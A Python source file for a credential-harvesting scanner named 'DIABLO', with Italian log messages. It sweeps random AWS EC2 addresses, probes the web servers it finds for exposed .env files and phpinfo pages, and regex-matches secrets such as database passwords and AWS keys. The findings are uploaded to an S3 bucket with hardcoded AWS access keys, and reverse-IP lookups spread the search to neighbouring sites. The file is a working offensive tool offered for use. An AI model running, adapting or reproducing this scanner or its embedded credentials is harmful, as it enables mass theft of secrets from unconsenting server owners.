import os
import sys
import re
import json
import hashlib
import string
import random
import ipaddress
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Thread

from gevent import monkey
monkey.patch_all(thread=False)
from gevent.pool import Pool

from urllib.parse import urlparse
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import warnings
import requests
import grequests
from itertools import islice

requests.packages.urllib3.disable_warnings()
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

class TeeLogger:
    def __init__(self, filepath):
        self.terminal = sys.stdout
        self.logfile = open(filepath, 'a', encoding='utf-8')
        self.at_newline = True

    def _ts(self):
        return time.strftime('%H:%M:%S', time.localtime())

    def write(self, message):
        if message and self.at_newline and not message.startswith('\r'):
            ts = f"[{self._ts()}] "
            self.terminal.write(ts)
            self.logfile.write(ts)
        self.terminal.write(message)
        self.logfile.write(message)
        self.at_newline = message.endswith('\n')

    def flush(self):
        self.terminal.flush()
        self.logfile.flush()

    def close(self):
        self.logfile.close()

LOGS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
LOG_FILE = None
LOG_PATH = None
LOG_UPLOAD_INTERVAL = random.randint(500, 800)
LOG_ACTIVE = False

# S3 CONFIG — bucket dedicato per i risultati DIABLO
S3_BUCKET = "q-pass-public"
S3_FOLDER = "diablo-results"
S3_REGION = "eu-north-1"
S3_ACCESS_KEY = "AKIA6FGTUF5CY6A4MIXK"
S3_SECRET_KEY = "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"
S3_HOST = f"s3.{S3_REGION}.amazonaws.com"

import hashlib
import hmac

def _aws_sign(key, msg):
    return hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()

def _aws_sigv4_headers(bucket, key, payload, content_type="application/octet-stream"):
    """Genera gli header Authorization per AWS Signature V4 (PUT object su S3)."""
    amz_date = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    date_stamp = amz_date[:8]
    service = "s3"
    algorithm = "AWS4-HMAC-SHA256"

    # Task 1 — Canonical Request
    canonical_uri = f"/{key}"
    canonical_querystring = ""
    payload_hash = hashlib.sha256(payload).hexdigest() if isinstance(payload, bytes) else hashlib.sha256(payload.encode()).hexdigest()

    canonical_headers = (
        f"host:{bucket}.{S3_HOST}\n"
        f"x-amz-content-sha256:{payload_hash}\n"
        f"x-amz-date:{amz_date}\n"
    )
    signed_headers = "host;x-amz-content-sha256;x-amz-date"

    canonical_request = (
        f"PUT\n"
        f"{canonical_uri}\n"
        f"{canonical_querystring}\n"
        f"{canonical_headers}\n"
        f"{signed_headers}\n"
        f"{payload_hash}"
    )

    # Task 2 — String to Sign
    credential_scope = f"{date_stamp}/{S3_REGION}/{service}/aws4_request"
    string_to_sign = (
        f"{algorithm}\n"
        f"{amz_date}\n"
        f"{credential_scope}\n"
        f"{hashlib.sha256(canonical_request.encode('utf-8')).hexdigest()}"
    )

    # Task 3 — Signing Key
    k_date = _aws_sign(("AWS4" + S3_SECRET_KEY).encode("utf-8"), date_stamp)
    k_region = _aws_sign(k_date, S3_REGION)
    k_service = _aws_sign(k_region, service)
    k_signing = _aws_sign(k_service, "aws4_request")

    # Task 4 — Signature
    signature = hmac.new(k_signing, string_to_sign.encode("utf-8"), hashlib.sha256).hexdigest()

    auth = (
        f"{algorithm} Credential={S3_ACCESS_KEY}/{credential_scope}, "
        f"SignedHeaders={signed_headers}, "
        f"Signature={signature}"
    )

    return {
        "Host": f"{bucket}.{S3_HOST}",
        "x-amz-date": amz_date,
        "x-amz-content-sha256": payload_hash,
        "Authorization": auth,
        "Content-Type": content_type,
    }

DNS_WORKERS_EC2 = 100
DNS_TIMEOUT_EC2 = 3
MAX_IPS_PER_CIDR = 5

TOTAL_SLOTS = 2000
NUM_WORKERS = 1

_CONTAINER_NAME = os.environ.get('HOSTNAME', f'local_{int(time.time())}')
_SLOT_HASH = int(hashlib.md5(_CONTAINER_NAME.encode()).hexdigest()[:12], 16)
INSTANCE_ID = _SLOT_HASH % TOTAL_SLOTS

def upload_file_to_s3(local_path, remote_path, max_retries=3):
    """Carica un file su S3 nella cartella dedicata diablo-results — via HTTP PUT + AWS SigV4 (no boto3)."""
    s3_key = f"{S3_FOLDER}/{remote_path}"
    last_error = None
    for attempt in range(max_retries):
        try:
            print(f"[S3 UPLOAD] Invio file {local_path} verso s3://{S3_BUCKET}/{s3_key} (tentativo {attempt+1}/{max_retries})...", flush=True)
            with open(local_path, "rb") as f:
                payload = f.read()

            headers = _aws_sigv4_headers(S3_BUCKET, s3_key, payload)
            url = f"https://{S3_BUCKET}.{S3_HOST}/{s3_key}"
            res = requests.put(url, headers=headers, data=payload, timeout=30)

            if res.status_code in [200, 201]:
                print(f"[S3 UPLOAD] OK Caricato su S3: s3://{S3_BUCKET}/{s3_key}", flush=True)
                return True
            elif res.status_code == 429:
                wait = 2 ** attempt
                print(f"[S3 UPLOAD] Rate limited (429), retry tra {wait}s...", flush=True)
                time.sleep(wait)
                last_error = "429 Rate Limited"
            elif res.status_code >= 500:
                wait = 2 ** attempt
                print(f"[S3 UPLOAD] Server error {res.status_code}, retry tra {wait}s...", flush=True)
                time.sleep(wait)
                last_error = f"Status {res.status_code} - {res.text[:200]}"
            else:
                print(f"[S3 UPLOAD] Errore upload {s3_key}: Status {res.status_code} - {res.text[:200]}", flush=True)
                last_error = f"Status {res.status_code} - {res.text[:200]}"
                return False
        except Exception as e:
            last_error = str(e)
            if attempt < max_retries - 1:
                wait = 2 ** attempt
                print(f"[S3 UPLOAD] Eccezione upload {s3_key}: {e}, retry tra {wait}s...", flush=True)
                time.sleep(wait)
            else:
                print(f"[S3 UPLOAD] Upload FALLITO definitivamente {s3_key}: {e}", flush=True)
    if last_error:
        try:
            with open(os.path.join('risultati', 'ERROR2.txt'), 'a', encoding='utf-8') as f:
                f.write(f"Error uploading to S3 ({s3_key}): {last_error}\n")
        except:
            pass
    return False

def upload_log_to_s3():
    if not LOG_ACTIVE:
        return
    if not LOG_PATH or not os.path.exists(LOG_PATH):
        return
    remote = f"logs/{os.path.basename(LOG_PATH)}"
    upload_file_to_s3(LOG_PATH, remote, max_retries=1)

def load_config():
    try:
        with open('pack.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

config = load_config()
keyword_regexenv = config.get('APP_REGEX_ENV_SHELL', [])
file_envscan = list(dict.fromkeys(config.get('file_env_shellscan', [])))
file_phpprofile = list(dict.fromkeys(config.get('file_phpprofile_shellscan', [])))

result_dir = 'risultati'
newpathtextract = os.path.join(result_dir, 'DIABLO_FILES_SPLIT')

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive"
}

def generate_list_env_from_json_multi(site_link):
    base = site_link.rstrip('/')
    for i in range(0, len(file_envscan), 100):
        yield [f"{base}/{p.lstrip('/')}" for p in file_envscan[i:i + 100]]

def generate_list_phpprofile_from_json_multi(site_link):
    base = site_link.rstrip('/')
    for i in range(0, len(file_phpprofile), 20):
        yield [f"{base}/{p.lstrip('/')}" for p in file_phpprofile[i:i + 20]]

def content_diablo_resp(req):
    if sys.version_info[0] < 3:
        try:
            try: return str(req.content)
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.content.decode('utf-8'))
        except: return str(req.text)
    else:
        try:
            return str(req.content.decode('utf-8', errors='ignore'))
        except Exception:
            try:
                return str(req.text)
            except Exception:
                return str(req.content)

def get_initial_url(url):
    if url.startswith('http://') or url.startswith('https://'):
        return url
    if url.endswith(':443'):
        return f"https://{url}"
    if url.endswith(':80'):
        return f"http://{url}"
    return f"http://{url}"

def get_retry_url(url):
    if url.startswith('http://'):
        return url.replace('http://', 'https://', 1)
    if url.startswith('https://'):
        return url.replace('https://', 'http://', 1)
    if url.endswith(':443') or url.endswith(':80'):
        return None
    return f"https://{url}"

def reverse_ip_lookup(ip):
    url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            result = response.text.strip()
            if "No DNS A records found" in result or "API count exceeded" in result or "error" in result.lower():
                return None
            else:
                aweee = []
                domains = result.split('\n')
                for d in domains:
                    if d.startswith("www."):
                        d = d[4:]
                    aweee.append(d)
                return aweee
    except:
        pass
    return None

def process_urls(urls_list, is_fallback=False):
    it = iter(urls_list)
    print(f"\n[SCANNER] 🚀 Avvio scansione su {len(urls_list)} URL (fallback={is_fallback})...", flush=True)
    while True:
        chunk = list(islice(it, 100))
        if not chunk:
            break

        print(f"[SCANNER] Controllo blocco di {len(chunk)} URL...", flush=True)
        try:
            resp_site = [
                grequests.get(get_initial_url(url), timeout=3, stream=True, verify=False, allow_redirects=False)
                for url in chunk
            ]
            merdb = grequests.map(resp_site)
            hosts_by_site = {}
            for r in merdb:
                if r is not None and r.status_code in [requests.codes.ok, 403, 206]:
                    site_url = r.url
                    if site_url not in hosts_by_site:
                        hosts_by_site[site_url] = {
                            'env': list(generate_list_env_from_json_multi(site_url)),
                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
                        }
                if r: r.close()

            retry_urls = []
            for i, r in enumerate(merdb):
                if r is None or (r.status_code not in [requests.codes.ok, 403, 206]):
                    retry_u = get_retry_url(chunk[i])
                    if retry_u:
                        retry_urls.append(retry_u)

            if retry_urls:
                print(f"[SCANNER] Retry su {len(retry_urls)} URL in HTTPS...", flush=True)
            resp_retry = [
                grequests.get(url, timeout=3, stream=True, verify=False, allow_redirects=False)
                for url in retry_urls
            ]
            retry_responses = grequests.map(resp_retry)
            for r in retry_responses:
                if r is not None and r.status_code in [requests.codes.ok, 403, 206]:
                    site_url = r.url
                    if site_url not in hosts_by_site:
                        hosts_by_site[site_url] = {
                            'env': list(generate_list_env_from_json_multi(site_url)),
                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
                        }
                if r: r.close()

            site_pool = Pool(50)
            jobs = []
            for site_link, site_payloads in hosts_by_site.items():
                print(f"  [SCANNER] 🎯 Analisi target attivo: {site_link}", flush=True)
                jobs.append(site_pool.spawn(_scan_site, site_link, site_payloads, is_fallback))
            site_pool.join()

            del hosts_by_site
            del jobs

        except Exception as e:
            try:
                with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
                    f.write(str(e) + '\n')
            except:
                pass

def _scan_site(site_link, site_payloads, is_fallback=False):
    try:
        found_env_urls = []
        found_php_urls = []
        wildcard_strike_count = 0
        fake_for_site = False
        found_for_site = False
        headers_scout = dict(headers)
        seen_content_hashes = set()
        headers_file_probe = dict(headers)
        headers_file_probe['Range'] = 'bytes=0-4096'
        findfile_requests = []
        findfile_requestsunicque = []
        regex_found_one = False
        regex_found = False
        env_batches = site_payloads.get('env', [])
        for batch in env_batches:
            if fake_for_site or found_for_site or regex_found_one: break
            reqss = [grequests.get(url, stream=True, timeout=5, verify=False, allow_redirects=False) for url in batch]
            merdb = grequests.map(reqss)
            for r in merdb:
                if r is not None and r.status_code in [200, 206]:
                    findfile_requests.append(r)
                else:
                    try: r.close()
                    except: pass
                if fake_for_site or found_for_site or regex_found_one: break
            if len(findfile_requests) >= 10:
                fake_for_site = True
            if fake_for_site or found_for_site or regex_found_one: break


            if len(findfile_requests) >= 1:
                for r in findfile_requests:
                    rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                    if r is None: continue
                    try:
                        content = content_diablo_resp(r)
                        content_lower = content.lower()
                        if '<pre' in content_lower and '</pre>' in content_lower:
                            fake_for_site = True
                            break
                        if "popbox.fun" in content_lower:
                            fake_for_site = True
                            break
                    except:
                        pass


                    response_url = r.url
                    for pattern in keyword_regexenv:
    
                        is_regex = any(c in pattern for c in r".^$*+?{}[]\|()")
                        if is_regex: regex_pattern = pattern
                        else:
                            escaped = re.escape(pattern)
                            start_b = r"\b" if pattern[0].isalnum() or pattern[0] == '_' else ""
                            end_b = r"\b" if pattern[-1].isalnum() or pattern[-1] == '_' else ""
                            regex_pattern = f"{start_b}{escaped}{end_b}"

                        if re.search(regex_pattern, content, re.IGNORECASE):
                            found_for_site = True
                            regex_found_one = True
                            break

                    if regex_found_one:

                        print(f"    [!] 🔥 VULNERABILITA' TROVATA (Regex): {response_url}", flush=True)
                        

                        saved_file_path = None
                        remote_subpath = None

                        saved_file_path = os.path.join(newpathtextract, f'DIABLO_ENV_NEW_{rnd_suffix}.txt')
                        with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{content}\n')
                        remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_ENV_NEW_{rnd_suffix}.txt"

                        if saved_file_path and remote_subpath:
                            upload_file_to_s3(saved_file_path, remote_subpath)

                    try: r.close()
                    except: pass


                    if fake_for_site or found_for_site or regex_found_one: break

        if fake_for_site: return


        if found_for_site == False:
            php_batches = site_payloads.get('php', [])
            for batch in php_batches:
                if fake_for_site or found_for_site or regex_found: break
                reqss = [grequests.post(url, data={"0x01[]":"legion"}, timeout=5, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe) for url in batch]
                merdb = grequests.map(reqss)
                unique_responses = {}
                for r in merdb:
                    if r is not None and r.status_code in [200, 206]:
                        if r.url not in unique_responses:
                            try:
                                content = r.content
                                content_len = len(content)
                            except:
                                r.close()
                                continue
                            if content_len < 10 or content_len > 1000000:
                                r.close()
                                continue
                            is_html_doc = b'<html' in content[:200].lower() or b'<!doctype' in content[:200].lower()
                            is_debug_page = False
                            if is_html_doc:
                                content_str_head = content[:5000].decode('utf-8', errors='ignore').lower()
                                debug_keywords = ['phpinfo()', 'php version', 'zend extension', 'php license', 'sf-toolbar', 'symfony profiler', 'php-debugbar', 'whoops! there was an error', 'stack trace', 'aws_access_key_id', 'db_password', 'db_host', 'aws_secret']
                                if any(k in content_str_head for k in debug_keywords):
                                    is_debug_page = True

                                    
                            if is_html_doc and not is_debug_page:
                                r.close()
                                continue


                            content_hash = hashlib.md5(content).hexdigest()
                            if content_hash in seen_content_hashes:
                                wildcard_strike_count += 1
                                r.close()
                                if wildcard_strike_count >= 5:
                                    fake_for_site = True
                                    break
                                continue
                            seen_content_hashes.add(content_hash)
                            unique_responses[r.url] = r
                            findfile_requestsunicque.append(r)
                                
                        else: r.close()


                valid_responzzz = list(unique_responses.values())
                if valid_responzzz:
                    
                    for r in findfile_requestsunicque:
                        if r is None: continue
                        try:
                            contentsx = content_diablo_resp(r)
                        except:
                            pass
                        else:
                            response_url = r.url
                            for pattern in keyword_regexenv:
                                is_regex = any(c in pattern for c in r".^$*+?{}[]\|()")
                                if is_regex: regex_pattern = pattern
                                else:
                                    escaped = re.escape(pattern)
                                    start_b = r"\b" if pattern[0].isalnum() or pattern[0] == '_' else ""
                                    end_b = r"\b" if pattern[-1].isalnum() or pattern[-1] == '_' else ""
                                    regex_pattern = f"{start_b}{escaped}{end_b}"

                                if re.search(regex_pattern, contentsx, re.IGNORECASE):
                                    found_for_site = True
                                    regex_found = True
                                    break

                            if regex_found:

                                print(f"    [!] 🔥 VULNERABILITA' TROVATA (Regex): {response_url}", flush=True)
                                

                                try:
                                    html_content = r.text
                                    soup = BeautifulSoup(html_content, "html.parser")
                                    h2_tag = soup.find("h2", string="PHP Variables")
                                    if h2_tag:
                                        table = h2_tag.find_next("table")
                                        if table:
                                            rows = table.find_all("tr")
                                            formatted_output = ""
                                            for row in rows:
                                                cols = row.find_all("td")
                                                if len(cols) >= 2:
                                                    var_name = cols[0].get_text(strip=True)
                                                    var_value = cols[1].get_text(strip=True)
                                                    match = re.search(r"\['([^']+)'\]", var_name)
                                                    if match:
                                                        clean_key = match.group(1)
                                                        formatted_output += f"{clean_key} \t {var_value}\n"
                                            if formatted_output:
                                                print(f"    [!] 🐘 TROVATO PHPINFO: {response_url}", flush=True)
                                                rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

                                                saved_file_path = None
                                                remote_subpath = None

                                                saved_file_path = os.path.join(newpathtextract, f'DIABLO_PHPINFO_{rnd_suffix}.txt')
                                                with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
                                                remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix}.txt"

                                                if saved_file_path and remote_subpath:
                                                    upload_file_to_s3(saved_file_path, remote_subpath)


                                except: pass


                            try: r.close()
                            except: pass

                if fake_for_site or found_for_site or regex_found: break        


        if found_for_site and not is_fallback:
            hostxxx = urlparse(site_link).hostname
            if not hostxxx:
                return

            if hostxxx.startswith("www."):
                hostxxx = hostxxx[4:]

            try:
                target_ip = socket.gethostbyname(hostxxx)
            except Exception:
                target_ip = None

            if target_ip:
                cazzuno = reverse_ip_lookup(target_ip)
                if cazzuno:
                    hostxxx_clean = hostxxx.lower().rstrip('/')
                    cazzuno = [d for d in cazzuno if d.lower().rstrip('/') != hostxxx_clean]
                    if cazzuno:
                        process_urls(cazzuno, is_fallback=True)

    except Exception as e:
        try:
            with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f: f.write(str(e) + '\n')
        except:
            pass

def fetch_aws_ips():
    url = "https://ip-ranges.amazonaws.com/ip-ranges.json"
    print("[AWS FETCH] Scaricamento dati IP ranges da AWS...", flush=True)
    resp = requests.get(url, timeout=30)
    resp.raise_for_status()
    return resp.json()

def get_ec2_cidrs(data):
    cidrs = []
    for p in data["prefixes"]:
        if p["service"] == "EC2":
            cidrs.append((p["ip_prefix"], p["region"]))
    return cidrs

def build_cidr_pool(cidrs_with_regions):
    sources = []
    for cidr, region in cidrs_with_regions:
        try:
            net = ipaddress.ip_network(cidr, strict=False)
            total = net.num_addresses
            first = int(net.network_address)
            sources.append((first, total, region))
        except Exception:
            pass

    regions_set = set(r for _, _, r in sources)
    print(f"[AWS POOL] {len(sources)} CIDR in {len(regions_set)} regioni "
          f"(max {MAX_IPS_PER_CIDR:,} IP/CIDR, sample casuale ogni ciclo)", flush=True)
    return sources

def verify_ec2_webserver(ip, region):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        hostname = hostname.lower()
        if "compute.amazonaws.com" not in hostname:
            return None
        for port, proto in [(443, "https"), (80, "http")]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((hostname, port))
                s.close()
                return f"{proto}://{hostname}"
            except Exception:
                continue
        return None
    except Exception:
        return None

def gather_and_scan_cycle(cidr_pool, worker_id, num_workers, cycle_num):
    total_cidrs = len(cidr_pool)
    seen_urls = set()
    all_ips = []

    for first, total, region in cidr_pool:
        rem = (INSTANCE_ID - (first % TOTAL_SLOTS)) % TOTAL_SLOTS
        if rem >= total:
            continue

        offsets_pool = list(range(rem, total, TOTAL_SLOTS))
        rng = random.Random(first * 7919)
        rng.shuffle(offsets_pool)

        n_take = min(len(offsets_pool), MAX_IPS_PER_CIDR)
        start = (cycle_num - 1) * MAX_IPS_PER_CIDR
        if start >= len(offsets_pool):
            continue
        end = min(start + n_take, len(offsets_pool))
        chosen = offsets_pool[start:end]

        for off in chosen:
            all_ips.append((str(ipaddress.ip_address(first + off)), region))

    random.shuffle(all_ips)

    my_ips = [(ip, region) for i, (ip, region) in enumerate(all_ips) if i % num_workers == worker_id]
    random.shuffle(my_ips)
    total_my = len(my_ips)

    total_container = len(all_ips)
    if worker_id == 0:
        print(f"[AWS GATHER #{cycle_num}] Shard {INSTANCE_ID}/{TOTAL_SLOTS}, "
              f"{total_container:,} IP esclusivi "
              f"({total_cidrs} CIDR × {MAX_IPS_PER_CIDR}), "
              f"divisi tra {num_workers} worker (~{total_container // num_workers:,} ciascuno). "
              f"DNS + TCP verify in corso ({DNS_WORKERS_EC2} thread)...", flush=True)

    chunk = []
    hits = 0
    processed = 0
    last_pct = -1

    for ip, region in my_ips:
        chunk.append((ip, region))

        if len(chunk) >= DNS_WORKERS_EC2:
            with ThreadPoolExecutor(max_workers=DNS_WORKERS_EC2) as executor:
                futures = {executor.submit(verify_ec2_webserver, ip, region): (ip, region)
                          for ip, region in chunk}
                for future in as_completed(futures):
                    try:
                        url = future.result(timeout=DNS_TIMEOUT_EC2 + 3)
                    except Exception:
                        processed += 1
                        continue
                    processed += 1
                    if url and url not in seen_urls:
                        seen_urls.add(url)
                        hits += 1

            pct = processed * 100 // total_my
            if pct >= last_pct + 10:
                last_pct = pct - (pct % 10)
                bad = processed - hits
                print(f"[W{worker_id} GATHER #{cycle_num}] {pct}% ({processed:,}/{total_my:,}) "
                      f"— {hits} webserver, {bad} scartati", flush=True)

            chunk = []

    if chunk:
        with ThreadPoolExecutor(max_workers=min(DNS_WORKERS_EC2, len(chunk))) as executor:
            futures = {executor.submit(verify_ec2_webserver, ip, region): (ip, region)
                      for ip, region in chunk}
            for future in as_completed(futures):
                try:
                    url = future.result(timeout=DNS_TIMEOUT_EC2 + 3)
                except Exception:
                    processed += 1
                    continue
                processed += 1
                if url and url not in seen_urls:
                    seen_urls.add(url)
                    hits += 1

    urls = list(seen_urls)
    random.shuffle(urls)
    bad = processed - hits
    print(f"[W{worker_id} GATHER #{cycle_num}] Fase 1: {hits} web server, {bad} scartati "
          f"su {total_my:,} IP.", flush=True)

    if urls:
        print(f"[W{worker_id}] Fase 2 — Scansione di {len(urls)} URL verificati...", flush=True)
        process_urls(urls)
        print(f"[W{worker_id}] Fase 2 completata.", flush=True)
    else:
        print(f"[W{worker_id}] Nessun URL trovato. Salto scansione.", flush=True)

def main():
    global LOG_PATH

    if LOG_ACTIVE:
        os.makedirs(LOGS_DIR, exist_ok=True)
        container_id = os.environ.get('HOSTNAME', f'local_{int(time.time())}')
        LOG_PATH = os.path.join(LOGS_DIR, f'{container_id}.log')
        sys.stdout = TeeLogger(LOG_PATH)
        sys.stderr = sys.stdout

    print("\n[SYSTEM] 🛡️ Inizializzazione scanner DIABLO in modalità CLOUD WORKER...", flush=True)
    if LOG_ACTIVE:
        print(f"[SYSTEM] Log salvato in: {LOG_PATH}", flush=True)
    os.makedirs(result_dir, exist_ok=True)
    os.makedirs(newpathtextract, exist_ok=True)

    print(f"[SYSTEM] Container-ID={INSTANCE_ID} (di {TOTAL_SLOTS} slot), "
          f"{NUM_WORKERS} worker, "
          f"~{MAX_IPS_PER_CIDR} IP/CIDR — loop infinito", flush=True)

    aws_data = fetch_aws_ips()
    ec2_cidrs = get_ec2_cidrs(aws_data)

    if not ec2_cidrs:
        print("[SYSTEM] Nessun CIDR EC2 trovato. Uscita.", flush=True)
        return

    print(f"[SYSTEM] Trovati {len(ec2_cidrs)} CIDR EC2. Costruzione pool CIDR...", flush=True)
    cidr_pool = build_cidr_pool(ec2_cidrs)

    print(f"[SYSTEM] Avvio {NUM_WORKERS} worker thread (loop infinito)", flush=True)

    def worker_loop(worker_id):
        cycle = 0
        while True:
            cycle += 1
            gather_and_scan_cycle(cidr_pool, worker_id, NUM_WORKERS, cycle)
            print(f"[W{worker_id}] Ciclo #{cycle} completato.", flush=True)

    def log_upload_loop():
        while True:
            time.sleep(LOG_UPLOAD_INTERVAL)
            try:
                upload_log_to_s3()
            except Exception:
                pass

    threads = []
    for w in range(NUM_WORKERS):
        t = Thread(target=worker_loop, args=(w,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.2)

    log_thread = Thread(target=log_upload_loop, daemon=True)
    log_thread.start()

    print(f"[SYSTEM] Tutti i {NUM_WORKERS} worker + upload log avviati. Loop infinito.", flush=True)

    for t in threads:
        t.join()

if __name__ == '__main__':
    main()
